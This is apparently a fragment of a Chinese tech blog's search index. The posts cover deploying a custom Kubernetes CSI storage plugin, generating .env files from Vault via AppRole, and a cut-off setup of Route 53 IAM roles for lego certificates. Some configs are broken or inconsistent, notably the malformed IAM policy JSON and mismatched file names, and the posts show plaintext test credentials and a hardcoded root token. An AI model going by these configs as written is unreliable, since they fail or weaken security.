csi而来，这样既可以跑到底层上提供文件块设备，也可以上升到类似NFS或者S3的层次提供文件系统，能满足大多数需求。那源代码就绝对不提供了，只说一下过程：\nCSI PLUGIN的使用方法： 一、导入镜像 csi存储插件的image\ncr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 文件：csi.tar\n将文件放到所有worknode上，导入本地镜像库:\nctr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar crictl -r unix:///run/k3s/containerd/containerd.sock images 看到有 cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 既是导入成功\n二、安装controller和nodeserver 安装driver\n文件：driver.yaml\nkubectl apply -f driver.yaml 安装controller\n文件：controller.yaml\nkubectl apply -f controller.yaml 安装nodeserver\n文件：nodeserver.yaml\n解释一下，controller是一个statefulset，整个集群运行一个即可；而nodeservershi则是一个daemonset，每个worknode都会运行一个副本\n上面 worknode 是3个，所以有3个副本\n三、scaleflash 块设备的使用 块设备最小单位是G，所以如果需求了100M，那也是1G。\n首先必须定义一个storageclass，以后使用这一个storageclass就可以了：\ncat \u0026lt;\u0026lt; EOF \u0026gt;scaleflash-storageclass.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: scaleflash provisioner: ru.yandex.s3.csi parameters: mounter: scaleflash clstID: \u0026#34;nvmatrix_101\u0026#34; fsType: \u0026#34;xfs\u0026#34; EOF kubectl apply -f scaleflash-storageclass.yaml 再定义pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; csi-pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: csi-pvc namespace: default spec: accessModes: - ReadWriteOnce resources: requests: storage: 100M storageClassName: scaleflash EOF kubectl apply -f csi-pvc.yaml 定义Pod使用这个pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-csi-pvc.yaml --- apiVersion: v1 kind: Pod metadata: name: nginx-pod-s3 spec: containers: - name: nginx-pod-s3 image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; name: dynamic-storage volumes: - name: dynamic-storage persistentVolumeClaim: claimName: csi-pvc EOF kubectl apply -f nginx-csi-pvc.yaml 进入pod，看到lun已经被mount上了，就ok了\n反向删除掉Pod和pvc资源：\nkubectl delete -f nginx-csi-pvc.yaml kubectl delete -f csi-pvc.yaml 验证statefulset:\ncat \u0026lt;\u0026lt; EOF \u0026gt; stateful.yaml apiVersion: apps/v1 kind: StatefulSet metadata: name: statefulset-smb namespace: default labels: app: nginx spec: serviceName: statefulset-smb replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: statefulset-smb image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent command: - \u0026#34;/bin/bash\u0026#34; - \u0026#34;-c\u0026#34; - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/data/outfile; sleep 1; done volumeMounts: - name: persistent-storage mountPath: /mnt/data readOnly: false updateStrategy: type: RollingUpdate selector: matchLabels: app: nginx volumeClaimTemplates: - metadata: name: persistent-storage namespace: default spec: storageClassName: scaleflash accessModes: - ReadWriteOnce resources: requests: storage: 1Gi EOF kubectl apply -f stateful.yaml 可以放缩副本数，然后观察 /mnt/data/outfile 是否带有刚启动时候的时间戳来确定卷是否是保留的。\n四、nvfile的使用（类似NFS） 注意点：rootPath 必须是存在/mnt下，因为只有/mnt被挂进了controller，挂/进去是不行的，所以其它的都无法识别出来\n卷容量大小跟NFS一样没有意义，写了也不起任何作用。\n定义storageclass\ncat \u0026lt;\u0026lt; EOF \u0026gt; storageclass01.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: nvfile provisioner: ru.yandex.s3.csi parameters: mounter: nvfile rootPath: \u0026#34;/mnt/nvfile\u0026#34; modePerm: \u0026#34;0777\u0026#34; EOF kubectl apply -f storageclass01.yaml 注意上面，没有定义subPath，所以新目录都会被建立在/mnt/nvfile下。\n如果要定义在某个子目录（比如prod）下， 可以再定义一个storageClass，到时候引用这个新storageclass即可\n--- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: nvfile-prod provisioner: ru.yandex.s3.csi parameters: mounter: nvfile rootPath: \u0026#34;/mnt/nvfile\u0026#34; subPath: \u0026#34;/prod\u0026#34; modePerm: \u0026#34;0777\u0026#34; 定义pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nvfile-pvc.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: nvfile-pvc namespace: default spec: accessModes: - ReadWriteOnce resources: requests: storage: 100M storageClassName: nvfile EOF kubectl apply -f nvfile-pvc.yaml 定义一个Pod，使用上面的pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-nvfile.yaml --- apiVersion: v1 kind: Pod metadata: name: nginx-nvfile spec: containers: - name: nginx-nvfile image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; name: dynamic-storage volumes: - name: dynamic-storage persistentVolumeClaim: claimName: nvfile-pvc EOF kubectl apply -f nginx-nvfile.yaml 进入容器，看到nvfile_nodev的mount点就是成功\nstatefulset的验证：\ncat \u0026lt;\u0026lt; EOF \u0026gt; stateful-nvfile.yaml --- apiVersion: apps/v1 kind: StatefulSet metadata: name: statefulset-nvfile-ng namespace: default labels: app: nvfile-nginx spec: serviceName: statefulset-nvfie-ng replicas: 3 template: metadata: labels: app: nvfile-nginx spec: containers: - name: statefulset-nvfile-ng image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent command: - \u0026#34;/bin/bash\u0026#34; - \u0026#34;-c\u0026#34; - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/smb/outfile; sleep 1; done volumeMounts: - name: pvc mountPath: /mnt/smb readOnly: false updateStrategy: type: RollingUpdate selector: matchLabels: app: nvfile-nginx volumeClaimTemplates: - metadata: name: pvc spec: storageClassName: nvfile accessModes: [\u0026#34;ReadWriteOnce\u0026#34;] resources: requests: storage: 1Gi EOF kubectl apply -f stateful-nvfile.yaml 同样进行伸缩，查看mount点上的文件/mnt/smb/outfile，是否带有刚启动时候的时间戳来判断是否为原始卷\n五、S3的使用 S3的话就没有任何约束，只要能跑S3协议，虚机也可以用。\n首先建立个minio的S3来模拟，因为9000端口被占，所以用8000端口\nhttp://192.168.66.101:8000\nusername: abcdefg\npassword: abcdefg\n进入后，gen一对key，赋予S3的所有权限，确保可以建立新bucket\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:*\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:s3:::*\u0026#34; ] } ] } key:\naccessKeyID: lj7mL2gAFgRCykTaaabbb secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb 然后建立secret\ncat \u0026lt;\u0026lt; EOF \u0026gt; secret-s3.yaml --- apiVersion: v1 kind: Secret metadata: name: csi-s3-secret # Namespace depends on the configuration in the storageclass.yaml namespace: kube-system stringData: accessKeyID: lj7mL2gAFgRCyaaaabbbb secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb # For AWS set it to \u0026#34;https://s3.\u0026lt;region\u0026gt;.amazonaws.com\u0026#34;, for example https://s3.eu-central-1.amazonaws.com endpoint: http://192.168.66.101:8000 # For AWS set it to AWS region #region: \u0026#34;\u0026#34; EOF kubectl apply -f secret-s3.yaml 再建立storageclass\ncat \u0026lt;\u0026lt; EOF \u0026gt; s3-storageclass.yaml --- kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: csi-s3 provisioner: ru.yandex.s3.csi parameters: mounter: geesefs # you can set mount options here, for example limit memory cache size (recommended) options: \u0026#34;--memory-limit 1000 --dir-mode 0777 --file-mode 0666\u0026#34; # to use an existing bucket, specify it here: #bucket: some-existing-bucket csi.storage.k8s.io/provisioner-secret-name: csi-s3-secret csi.storage.k8s.io/provisioner-secret-namespace: kube-system csi.storage.k8s.io/controller-publish-secret-name: csi-s3-secret csi.storage.k8s.io/controller-publish-secret-namespace: kube-system csi.storage.k8s.io/node-stage-secret-name: csi-s3-secret csi.storage.k8s.io/node-stage-secret-namespace: kube-system csi.storage.k8s.io/node-publish-secret-name: csi-s3-secret csi.storage.k8s.io/node-publish-secret-namespace: kube-system EOF kubectl apply -f s3-storageclass.yaml 建立pvc\ncat \u0026lt;\u0026lt; EOF \u0026gt; pvc-s3.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: csi-s3-pvc namespace: default spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi storageClassName: csi-s3 EOF kubectl apply -f csi-s3.yaml 建立pod\ncat \u0026lt;\u0026lt; EOF \u0026gt; nginx-s3.yaml --- apiVersion: v1 kind: Pod metadata: name: csi-s3-test-nginx namespace: default spec: containers: - name: csi-s3-test-nginx image: docker.io/library/nginx:latest imagePullPolicy: IfNotPresent volumeMounts: - mountPath: /usr/share/nginx/html/s3 name: webroot volumes: - name: webroot persistentVolumeClaim: claimName: csi-s3-pvc readOnly: false EOF kubectl apply -f nginx-s3.yaml 进入容器，看到一个pvc的卷即可\n去minio的界面，看到这个新卷对应的桶\nstatefulset也一样。\ns3更具体的可以参看：https://github.com/yandex-cloud/k8s-csi-s3/\n","permalink":"https://rendoumi.com/posts/20250807-csi_scaleflash/","summary":"\u003cp\u003e极客天成有个很厉害的scaleflash网络文件系统，充分利用rdma的无损网络特性，并进一步发扬光大。研发出来了可以顶替EMC盘阵的存储系统，可以在其上跑Oracle等数据库系统，真的是国货之光了。\u003c/p\u003e\n\u003cp\u003e帮它们改写了一个csi的存储插件，记录一下，基于yandex的s3 csi而来，这样既可以跑到底层上提供文件块设备，也可以上升到类似NFS或者S3的层次提供文件系统，能满足大多数需求。那源代码就绝对不提供了，只说一下过程：\u003c/p\u003e\n\u003ch2 id=\"csi-plugin的使用方法\"\u003eCSI PLUGIN的使用方法：\u003c/h2\u003e\n\u003ch4 id=\"一导入镜像\"\u003e一、导入镜像\u003c/h4\u003e\n\u003cp\u003ecsi存储插件的image\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e文件：csi.tar\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e将文件放到所有worknode上，导入本地镜像库:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrictl -r unix:///run/k3s/containerd/containerd.sock images\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看到有 cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 既是导入成功\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250807151100045\" loading=\"lazy\" src=\"/posts/20250807-csi_scaleflash/image-20250807151100045.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"二安装controller和nodeserver\"\u003e二、安装controller和nodeserver\u003c/h4\u003e\n\u003cp\u003e安装driver\u003c/p\u003e\n\u003cp\u003e文件：driver.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f driver.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装controller\u003c/p\u003e\n\u003cp\u003e文件：controller.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f controller.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装nodeserver\u003c/p\u003e\n\u003cp\u003e文件：nodeserver.yaml\u003c/p\u003e\n\u003cp\u003e解释一下，controller是一个statefulset，整个集群运行一个即可；而nodeservershi则是一个daemonset，每个worknode都会运行一个副本\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250807151213874\" loading=\"lazy\" src=\"/posts/20250807-csi_scaleflash/image-20250807151213874.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面 worknode 是3个，所以有3个副本\u003c/p\u003e\n\u003ch4 id=\"三scaleflash-块设备的使用\"\u003e三、scaleflash 块设备的使用\u003c/h4\u003e\n\u003cp\u003e块设备最小单位是G，所以如果需求了100M，那也是1G。\u003c/p\u003e\n\u003cp\u003e首先必须定义一个storageclass，以后使用这一个storageclass就可以了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;scaleflash-storageclass.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: StorageClass\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: storage.k8s.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: scaleflash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eprovisioner: ru.yandex.s3.csi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eparameters:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  mounter: scaleflash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  clstID: \u0026#34;nvmatrix_101\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  fsType: \u0026#34;xfs\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f scaleflash-storageclass.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再定义pvc\u003c/p\u003e","title":"为极客天成改写一套CSI存储插件"},{"content":"Vault是个很厉害的 secret 引擎了，不多说了，主要用于集中管理各种密码、密钥。\n用来管理Kubernetes的凭据相当好，但是我们通常是自己开发的程序，然后需要读各种配置文件，比如连接DB的用户名，密码等等，最后连接到数据库。\n那么这种情况下，如果管理好配置项呢？\n方法如下，用approle读取Vault的配置信息：\n一、启动vault引擎测试环境 首先启动vault引擎，测试，用Docker，方便创建和销毁\n# 启动容器 # 我们手动指定了ROOT_TOKEN是root，这只用于测试环境 docker run -d --rm \\ --add-host host.docker.internal:host-gateway \\ --cap-add=IPC_LOCK \\ --name vault \\ -p 8200:8200 \\ -e VAULT_DEV_ROOT_TOKEN_ID=root \\ -e VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200 \\ hashicorp/vault --add-host host.docker.internal:host-gateway 这个个参数的作用是在容器的 /etc/hosts 文件中添加一个主机名和 IP 地址的映射。\n--add-host: 这是 docker run 的一个选项，用来在容器的 /etc/hosts 文件中添加一个自定义的主机条目。 host.docker.internal: 这是主机名。在 Docker Desktop（macOS 和 Windows）中，host.docker.internal 是一个特殊的 DNS 名称，它会被解析为宿主机的内部 IP 地址。 host-gateway: 这是 docker 在较新版本中引入的一个特殊关键字。它代表了宿主机与 Docker 网络之间的网关 IP 地址。在许多 Linux 环境中，这个关键字会指向 Docker 的网桥 IP（例如 172.17.0.1）。 综合起来，--add-host host.docker.internal:host-gateway 的作用是：\n在容器内部创建一个 DNS 条目，将 host.docker.internal 这个名字映射到宿主机的 IP 地址。这使得容器中的应用程序可以通过 host.docker.internal 这个域名来访问宿主机上运行的服务，而无需知道宿主机的具体 IP 地址。\n这对于开发环境非常有用，比如你的 Vault 容器需要访问在宿主机上运行的数据库或认证服务。\n容器跑起来之后我们验证一下：\nexport VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; export VAULT_TOKEN=\u0026#34;root\u0026#34; vault status 然后我们打开浏览器：http://x.x.x.x:8200，使用Token root登录\n看看有啥secret引擎，还真不少\n接下来的操作尽量都是在CLI命令行完成了。\n二、初始化各种配置信息 export VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; export VAULT_TOKEN=\u0026#34;root\u0026#34; # 放入测试数据 vault kv put secret/dbinfo user=root pass=test123 # 设置approle的认证方式 vault auth enable approle # 编辑一个policy文件，agent-policy.hcl cat \u0026lt; EOF \u0026gt; agent-policy.hcl path \u0026#34;secret/data/dbinfo\u0026#34; { capabilities = [\u0026#34;read\u0026#34;] } EOF # 写入policy vault policy write agent-policy agent-policy.hcl # 建立AppRole 并附加policy vault write auth/approle/role/vault-agent-role policies=\u0026#34;agent-policy\u0026#34; # gen出 role-id 和 secret-id vault read auth/approle/role/vault-agent-role/role-id vault write -f auth/approle/role/vault-agent-role/secret-id # 把 role-id 和 secert-id 放入文件 vault read -field role_id auth/approle/role/vault-agent-role/role-id \u0026gt; role-id 或 vault read auth/approle/role/vault-agent-role/role-id -format=json | jq -r .data.role_id \u0026gt; role-id # 注意，每次写都会变的 vault write -f -field secret_id auth/approle/role/vault-agent-role/secret-id \u0026gt; secret-id 或 vault write -f auth/approle/role/vault-agent-role/secret-id -format=json | jq -r .data.secret_id \u0026gt; secret-id unset VAULT_ADDR unset VAULT_TOKEN 注意上面一系列操作，跟IAM的操作基本一摸一样，如出一辙，先定义policy，然后policy附加role，role再gen出role-id和secret-id\n那role-id就相当于username，那secret-id就相当于password，这么理解就对了。\n三、配置Vault Agent代理，动态从Vault获取配置信息，并通过模板输出 设置vault-agent.hcl：\nvault { address = \u0026#34;http://127.0.0.1:8200\u0026#34; token = \u0026#34;root\u0026#34; } auto_auth { method { type = \u0026#34;approle\u0026#34; config = { role_id_file_path = \u0026#34;./role-id\u0026#34; secret_id_file_path = \u0026#34;./secret-id\u0026#34; remove_secret_id_file_after_reading = false } } sink { type = \u0026#34;file\u0026#34; config = { path = \u0026#34;./vault-agent-token\u0026#34; } } } template { source = \u0026#34;./env.tmpl\u0026#34; destination = \u0026#34;./.env\u0026#34; } 设置模板文件env.tmpl：\nDB_USER={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.user }}{{ end }} DB_PASS={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.pass }}{{ end }} 启动\nvault agent -config=./agent.hcl -log-level=debug 然后检查.env\ncat .env DB_USER=root DB_PASS=test123 cat vault-agent-token hvs.CAESILRWC98usmzSfxdJRMnKWUlvT9kFV1zzPfrkGgdBInYfGh4KHGh2cy54NHhEQnNUa2pmTzU5NTlRN1234567890 这样就ok了，但是这样也有个大麻烦，那就是token，如果重启token变了，那必须重新灌入。\n最后，放上agent的systemd文件/etc/systemd/system/vault-agent.service：\n[Unit] Description=Nomad Agent Requires=consul-online.target After=consul-online.target [Service] KillMode=process KillSignal=SIGINT ExecStart=/usr/local/bin/vault agent -config /etc/vault-agent.d/vault-agent.hcl ExecReload=/bin/kill -HUP $MAINPID Restart=on-failure RestartSec=2 StartLimitBurst=3 StartLimitIntervalSec=10 LimitNOFILE=65536 [Install] WantedBy=multi-user.target 关于Root Token\n第一次运行的时候，vault operator init 会得到这个这个Token\n随后呢，再得到这个，就必须 vault operator generate-root了，必须unseal key。\n再随后，用vault login，就可以用了。\n","permalink":"https://rendoumi.com/posts/20250806-vault_approle_env/","summary":"\u003cp\u003eVault是个很厉害的 secret 引擎了，不多说了，主要用于集中管理各种密码、密钥。\u003c/p\u003e\n\u003cp\u003e用来管理Kubernetes的凭据相当好，但是我们通常是自己开发的程序，然后需要读各种配置文件，比如连接DB的用户名，密码等等，最后连接到数据库。\u003c/p\u003e\n\u003cp\u003e那么这种情况下，如果管理好配置项呢？\u003c/p\u003e\n\u003cp\u003e方法如下，用approle读取Vault的配置信息：\u003c/p\u003e\n\u003ch5 id=\"一启动vault引擎测试环境\"\u003e一、启动vault引擎测试环境\u003c/h5\u003e\n\u003cp\u003e首先启动vault引擎，测试，用Docker，方便创建和销毁\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启动容器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 我们手动指定了ROOT_TOKEN是root，这只用于测试环境\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -d --rm \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --add-host host.docker.internal:host-gateway \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cap-add\u003cspan class=\"o\"\u003e=\u003c/span\u003eIPC_LOCK \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name vault \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -p 8200:8200 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -e \u003cspan class=\"nv\"\u003eVAULT_DEV_ROOT_TOKEN_ID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -e \u003cspan class=\"nv\"\u003eVAULT_DEV_LISTEN_ADDRESS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0:8200 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  hashicorp/vault\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"--add-host-hostdockerinternalhost-gateway\"\u003e\u003ccode\u003e--add-host host.docker.internal:host-gateway\u003c/code\u003e\u003c/h6\u003e\n\u003cp\u003e这个个参数的作用是在容器的 \u003ccode\u003e/etc/hosts\u003c/code\u003e 文件中添加一个主机名和 IP 地址的映射。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--add-host\u003c/code\u003e\u003c/strong\u003e: 这是 \u003ccode\u003edocker run\u003c/code\u003e 的一个选项，用来在容器的 \u003ccode\u003e/etc/hosts\u003c/code\u003e 文件中添加一个自定义的主机条目。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehost.docker.internal\u003c/code\u003e\u003c/strong\u003e: 这是主机名。在 Docker Desktop（macOS 和 Windows）中，\u003ccode\u003ehost.docker.internal\u003c/code\u003e 是一个特殊的 DNS 名称，它会被解析为宿主机的内部 IP 地址。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehost-gateway\u003c/code\u003e\u003c/strong\u003e: 这是 \u003ccode\u003edocker\u003c/code\u003e 在较新版本中引入的一个特殊关键字。它代表了宿主机与 Docker 网络之间的网关 IP 地址。在许多 Linux 环境中，这个关键字会指向 Docker 的网桥 IP（例如 \u003ccode\u003e172.17.0.1\u003c/code\u003e）。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e综合起来，\u003ccode\u003e--add-host host.docker.internal:host-gateway\u003c/code\u003e 的作用是：\u003c/strong\u003e\u003c/p\u003e","title":"vault使用agent验证approle生成.env环境变量"},{"content":"上一篇我们说了 Aws的EC2服务器用lego获得免费证书并更新到ACM，这下又来了个更加有难度的挑战：\nDNS解析是放在了AWS Route 53上，然后vps上跑着BT宝塔，用来代理转发开发环境的https证书\n这个环境如何用lego来安全的申请到证书并配置宝塔呢？这回可不像EC2那样可以自动附加IAM角色了\n我们先来看看lego的用法吧：\nhttps://go-acme.github.io/lego/dns/route53/\n语法如下：\n继续看，看来必须需要IAM的凭据才可以，继续下拉，有使用IAM的policy，那我们必须创建一个Role角色，然后再建立一个代理用户，gen出key，通过这个代理用户的凭据来间接进行访问\n步骤如下：\n一、去route53，拿到arn 我们要拿到具体域名的zone ID，就是Z0打头的那一串\n二、建立IAM实际工作的Role 首先建立一个Policy，route53AcmeCert\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17 \u0026#34;Statement\u0026#34;: [ \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;route53:GetChange\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:route53:::change/*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;route53:ListHostedZonesByName\u0026#34;, }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;route53:ListResourceRecordSets\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; ] }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;route53:ChangeResourceRecordSets\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; ], \u0026#34;Condition\u0026#34;: { \u0026#34;ForAllValues:StringEquals\u0026#34;: { \u0026#34;route53:ChangeResourceRecordSetsNormalizedRecordNames\u0026#34;: [ \u0026#34;_acme-challenge.example.com\u0026#34; ], \u0026#34;route53:ChangeResourceRecordSetsRecordTypes\u0026#34;: [ \u0026#34;TXT\u0026#34; ] } } } ] } 然后建立一个Role，RealUpdateCertRole，绑定上面的策略\n并且拿到这个Role角色的arn\n三、建立IAM实际工作的用户 建立一个用户CertProxyUser，这里不需要提前建立policy，直接用内联policy即可，arn替换成正确的\n其实就是STS动态获得指定用户的权限：\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ 